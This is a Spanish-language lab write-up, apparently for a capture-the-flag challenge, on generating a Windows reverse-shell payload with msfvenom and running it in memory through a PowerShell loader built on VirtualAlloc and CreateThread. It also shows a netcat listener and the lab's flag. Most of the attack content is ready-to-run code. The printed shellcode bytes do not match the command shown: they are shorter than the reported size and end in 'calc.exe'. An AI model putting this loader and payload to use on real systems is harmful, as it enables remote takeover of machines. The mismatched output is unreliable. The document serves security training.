# Objetivos de aprendizaje 

- Comprender los conceptos básicos de escritura de shell codes
- Generar shellcordes para reverse shells
- Ejectuar shellcodes con PowerShell

# Terminos esenciales

Antes de empezar, es muy importantes entender los conceptos porque nos ayudara para el contenido posterior. Shellcodes es un topico muy avanzado, pero conocer las idear mientras tenemos el material se hara mas accesible.

- Shellcode: Una pieza de codigo que normalmente usan los actores maliciosos durante la explotación como "buffer overflow" o ataque de injección de comandos dentro de sistemas vulnerables, de vez en cuando ejecutan comandos arbitrarios dando control a los atacantes y comprometiendo la máquina. Normalmente estan escritos en lengauje ensamblador.

- PowerShell: Un gran lenguaje de scripting y linea de comandos dentro de Windows para automatización de tareas y gestión de configuración. Da acceso al usuario a interactuar con los componentes de lsistema y usando al administrador como propositos legitimos. Sin embargo, los atacantes usan PowerShell para la post-explotación dando acceso a los recursos del sistema

- Windows Defender: Una herramienta de seguridad que detecta y previente scripts malicioss. Bypasses comunes metodos para evadir defensas incluyendo scripts ofuscados, haciendo al software mas dificil que entre.

- Windows API: Windows Application Programming Interface es un programa que interactua con el sistema operativo, dando acceso a lo sistemas esenciales, opearciones de archivos y red. Es como un puente entre las aplicaciones y el sistema operativo

- Reverse Shell: Un tipo de conexión con una máquina, inicialmente la conexión empieza con la máquina atacante.

![image](https://github.com/user-attachments/assets/49eda249-7d2c-4315-9276-08513682c197)

# Generar Shellcode

Aprender a generar un shellcode es como. Usaremos "msfvenom" para generar una rev shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
```

Donde LHOST = IP local

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKBOX_IP LPORT=1111 -f powershell
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of powershell file: 2259 bytes
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,
0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,
0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,
0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,
0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,
0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,
0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,
0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x1,0x8d,0x85,0xb2,0x0,0x0,
0x0,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,
0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,
0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x0
```

- p windows/x64/shell_reverse_tcp: la -p flag dice a msfvenom que tipo de payload quiere crear especificando también la ruta
- LHOST= ATTACKBOX_IP la IP referida a nuestra maquina
- LPORT=1111 E lpuerto por el que estamos escuchando la rev shell
- - f powershell: Especifica el formato de output este script específico esta hecho pra PowerShell
 
## Donde esta Actualmente el Shellcode

El shellcode actual esta en hex-encoded byte array, efezando por "0xfc" y luego numeros hexadecimales representando instrucciones a la máquina target. El orenador entiene el binario

Podemos ejecutar un shellcode ejecutado dentro de la memoria y crear una especificacion de ejecución. En este caso, usaremos PowerShell para llamar a una API de WIndows via un código C#.

```
$VrtAlloc = @"
using System;
using System.Runtime.InteropServices;

public class VrtAlloc{
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);  
}
"@

Add-Type $VrtAlloc 

$WaitFor= @"
using System;
using System.Runtime.InteropServices;

public class WaitFor{
 [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
}
"@

Add-Type $WaitFor

$CrtThread= @"
using System;
using System.Runtime.InteropServices;

public class CrtThread{
 [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
  
}
"@
Add-Type $CrtThread   

[Byte[]] $buf = SHELLCODE_PLACEHOLDER
[IntPtr]$addr = [VrtAlloc]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.Length)
$thandle = [CrtThread]::CreateThread(0, 0, $addr, 0, 0, 0)
[WaitFor]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

Es mucho código pero no nos estresemos

### Explicación del codigo

El script empieza definiendo las clases de C#. Las clases usan "DllImport" para atribuir una carga especifica refiriendose a "kernel32" DLL

- VirtualAlloc: Esta funciona localizada en memoria y proceso el spacio de dirección. Comunmente usada en escenario preparados para guardar en memoria y ejecutar el shellcode
- CreateThread: Esta funcion crear un nuevo reto en el proceso. Ejectura el shellcode cuando se carga en la memoria
- WaitForSingleObject: Esta funcion ejectura una especifica reto al acabar la tarea. En este caso se asegura que el shellcode se ha completado

Las clases de añaden a PowerShell usando "Add-Type" 

### Guardar el Shellcode en un Byte Array

El siguiente paso es guarda el shellcode en la variable $buf, un ejemplo abajo, "SHELLCODE_PLACEHOLDER" es una forma de ver insertar actual shellcode antes de generar "msfvenom" usualmente para remplazar un shellcode real, representado por valores hexadecimales.

### Alojar memoria el ShellCode

La funciona VirtualAlloc aloja la memoria y la bloquea

- 0 la dirección de memoria,
- $size: El tamaño de la memoria
- 0x3000 : tipo de localizacion
- 0x40: la protección de memoria


### Ejecutar ShellCode y esperar

Una vez el shelcode se haya guarda en la memoria, el script llama a "CReateThread" la funcion ejectua el shellcode. La instrucción empieza a ejecutar desde la memoria donde esta localizada espera a la función objeto y despues de esperar se ejecuta la shell.

# Ejecutar ShellCode

En nuestra máquina abrimos una escucha en el puerto que tengamos la shelll

```
nc -lvnp 1111
```

Debería quedar tal que así

![image](https://github.com/user-attachments/assets/a39d9caf-cc89-4a18-acfb-f901aa90402d)

![image](https://github.com/user-attachments/assets/d1f0648e-be31-42f3-9583-829a214279e1)

Estamos dentro

# Preguntas

Simplemente para sacar la flag es hacer exactamente lo mismo pero por el puerto 4444

C:\Users\glitch\Dekstop\flag.txt

```
AOC{GOT_MY_ACCESS_B@CK007}
```



